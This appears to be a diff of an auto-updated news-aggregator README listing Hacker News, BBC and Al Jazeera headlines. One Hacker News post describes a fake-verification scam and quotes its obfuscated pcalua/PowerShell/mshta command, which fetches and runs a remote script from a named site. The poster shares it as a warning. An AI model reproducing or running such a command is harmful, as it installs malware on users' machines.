@@ -1,10 +1,10 @@
 # 📰 Daily News Bot - 48+ Commits Daily
 
-**Last Update:** 2026-07-28 18:16:31
+**Last Update:** 2026-07-28 18:57:35
 
 **Total News:** 12
 
-**Sources:** BBC, Al Jazeera, NASA, Hacker News
+**Sources:** NASA, Hacker News, BBC, Al Jazeera
 
 ---
 
@@ -25,14 +25,30 @@ I clicked it, the spinner spun, and a box opened on the right, showing the tradi
 "pcalua -a "PowerShell" -c "saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/fine-work-team.com/6272' -Wi Hi""<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn't planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams / hack attempts in the future ? i always tought of myself "prepared" but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?</p>
 <hr />
 <p>Comments URL: <a href="https://news.ycombinator.com/item?id=49084404">https://news.ycombinator.com/item?id=49084404</a></p>
-<p>Points: 9</p>
-<p># Comments: 4</p>
+<p>Points: 21</p>
+<p># Comments: 12</p>
 
 🔗 **Read more:** [https://news.ycombinator.com/item?id=49084404](https://news.ycombinator.com/item?id=49084404)
 
 ---
 
-### 2. Show HN: tale.fyi, we deserve a home for fiction
+### 2. VMs can't boot with Network Mode set to Bridged on Apple M5 Pro machines
+
+**Source:** Hacker News
+
+**Category:** technology
+
+**Description:**
+<p>Article URL: <a href="https://github.com/utmapp/UTM/issues/7658">https://github.com/utmapp/UTM/issues/7658</a></p>
+<p>Comments URL: <a href="https://news.ycombinator.com/item?id=49083634">https://news.ycombinator.com/item?id=49083634</a></p>
+<p>Points: 3</p>
+<p># Comments: 1</p>
+
+🔗 **Read more:** [https://github.com/utmapp/UTM/issues/7658](https://github.com/utmapp/UTM/issues/7658)
+
+---
+
+### 3. Show HN: tale.fyi, we deserve a home for fiction
 
 **Source:** Hacker News
 
@@ -42,43 +58,14 @@ I clicked it, the spinner spun, and a box opened on the right, showing the tradi
 <p>for decades, i have been concerned that the internet was being built around non-fiction, so i built something to show how we could celebrate great fiction on the web.<p>i started with an amazing library from the public domain, and i also added tools to add your own stories<p>super interested to hear any feedback, and if you read anything good!</p>
 <hr />
 <p>Comments URL: <a href="https://news.ycombinator.com/item?id=49083389">https://news.ycombinator.com/item?id=49083389</a></p>
-<p>Points: 40</p>
-<p># Comments: 21</p>
+<p>Points: 47</p>
+<p># Comments: 31</p>
 
 🔗 **Read more:** [https://tale.fyi/@sam/announcing-tale-fyi-read-or-listen-to-an-entire-book-from-a-single-link](https://tale.fyi/@sam/announcing-tale-fyi-read-or-listen-to-an-entire-book-from-a-single-link)
 
 ---
 
-### 3. Show HN: Ctrlb-decompose: Strip the noise from logs before sending to LLMs
-
-**Source:** Hacker News
-
-**Category:** technology
-
-**Description:**
-<p>Article URL: <a href="https://github.com/ctrlb-hq/ctrlb-decompose">https://github.com/ctrlb-hq/ctrlb-decompose</a></p>
-<p>Comments URL: <a href="https://news.ycombinator.com/item?id=49083336">https://news.ycombinator.com/item?id=49083336</a></p>
-<p>Points: 32</p>
-<p># Comments: 5</p>
-
-🔗 **Read more:** [https://github.com/ctrlb-hq/ctrlb-decompose](https://github.com/ctrlb-hq/ctrlb-decompose)
-
----
-
-### 4. Schools to offer technical subjects from age 14 in England, Burnham says
-
-**Source:** BBC
-
-**Category:** world
-
-**Description:**
-The government wants pupils to take courses like AI and manufacturing which are linked to local jobs.
-
-🔗 **Read more:** [https://www.bbc.co.uk/news/articles/cj4k2djd5qpo?at_medium=RSS&at_campaign=rss](https://www.bbc.co.uk/news/articles/cj4k2djd5qpo?at_medium=RSS&at_campaign=rss)
-
----
-
-### 5. French patrol boat appears to fire gunshots in the Channel during MP's BBC interview
+### 4. French Navy carries out 'shooting drill' during MP's BBC interview
 
 **Source:** BBC
 
@@ -91,20 +78,46 @@ Shadow Home Secretary Chris Philp says the vessel fired 17 shots as he was givin
 
 ---
 
-### 6. Odyssey translator writes scathing review of Nolan film adaptation
+### 5. Powell says student loan system at top of in-tray
 
 **Source:** BBC
 
 **Category:** world
 
 **Description:**
-The film has won rave reviews from film critics but a translator of Homer's work was less than impressed.
+She says she stands by past comments that the interest charged on Plan 2 loans is "egregious".
 
-🔗 **Read more:** [https://www.bbc.co.uk/news/articles/cd692n215ndo?at_medium=RSS&at_campaign=rss](https://www.bbc.co.uk/news/articles/cd692n215ndo?at_medium=RSS&at_campaign=rss)
+🔗 **Read more:** [https://www.bbc.co.uk/news/articles/ce8l064xe52o?at_medium=RSS&at_campaign=rss](https://www.bbc.co.uk/news/articles/ce8l064xe52o?at_medium=RSS&at_campaign=rss)
 
 ---
 
-### 7. Iraqi PM visits Turkiye to boost ties despite complex challenges
+### 6. Naga Munchetty to leave BBC Breakfast after 17 years
+
+**Source:** BBC
+
+**Category:** world
+
+**Description:**
+The BBC One show's co-host will swap the TV sofa for the presenter's chair on Radio 5 Live Breakfast.
+
+🔗 **Read more:** [https://www.bbc.co.uk/news/articles/cn0ngrpp2p5o?at_medium=RSS&at_campaign=rss](https://www.bbc.co.uk/news/articles/cn0ngrpp2p5o?at_medium=RSS&at_campaign=rss)
+
+---
+
+### 7. FIFA World Cup: For India, qualification is still just a distant dream
+
+**Source:** Al Jazeera
+
+**Category:** world
+
+**Description:**
+India failed to qualify for next year&#039;s Asian Cup, making a FIFA World Cup 2030 or 2034 appearance unlikely.
+
+🔗 **Read more:** [https://www.aljazeera.com/sports/2026/7/28/fifa-world-cup-for-india-football-qualification-is-still-just-a-distant-dream?traffic_source=rss](https://www.aljazeera.com/sports/2026/7/28/fifa-world-cup-for-india-football-qualification-is-still-just-a-distant-dream?traffic_source=rss)
+
+---
+
+### 8. Iraqi PM visits Turkiye to boost ties despite complex challenges
 
 **Source:** Al Jazeera
 
@@ -117,7 +130,7 @@ Discussions to focus on &#039;strategic cooperation&#039;, as well as issues rel
 
 ---
 
-### 8. France and Spain brace for heatwave that could worsen raging wildfires
+### 9. France and Spain brace for heatwave that could worsen raging wildfires
 
 **Source:** Al Jazeera
 
@@ -127,19 +140,6 @@ Discussions to focus on &#039;strategic cooperation&#039;, as well as issues rel
 Both countries expect to see temperatures soar into Wednesday, which could cause the blazes to spread.
 
 🔗 **Read more:** [https://www.aljazeera.com/news/2026/7/28/france-and-spain-brace-for-heatwave-that-could-worsen-raging-wildfires?traffic_source=rss](https://www.aljazeera.com/news/2026/7/28/france-and-spain-brace-for-heatwave-that-could-worsen-raging-wildfires?traffic_source=rss)
-
----
-
-### 9. Roberto Mancini to be named Italy head coach for second time, source says
-
-**Source:** Al Jazeera
-
-**Category:** world
-
-**Description:**
-Mancini coached the national side in 2018-2023 and reportedly returns to the job with Italy having missed the World Cup.
-
-🔗 **Read more:** [https://www.aljazeera.com/sports/2026/7/28/mancini-to-become-italy-head-coach-for-second-time-source-says?traffic_source=rss](https://www.aljazeera.com/sports/2026/7/28/mancini-to-become-italy-head-coach-for-second-time-source-says?traffic_source=rss)
 
 ---
 
